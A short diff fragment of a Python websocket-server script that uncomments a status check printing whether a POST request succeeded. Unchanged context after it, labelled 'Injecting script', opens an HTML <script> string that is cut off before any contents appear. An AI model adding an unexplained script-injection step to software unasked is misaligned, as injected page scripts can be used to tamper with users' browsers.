@@ -37,11 +37,11 @@ async def websocket_server():
         # Send POST request
         response = requests.post(url, json=data)
 
-        # # Check if the request was successful
-        # if response.status_code == 200:
-        #     print('POST request successful!')
-        # else:
-        #     print('POST request failed:', response.status_code)
+        # Check if the request was successful
+        if response.status_code == 200:
+            print('POST request successful!')
+        else:
+            print('POST request failed:', response.status_code)
         # Injecting script
         script = """
         <script>
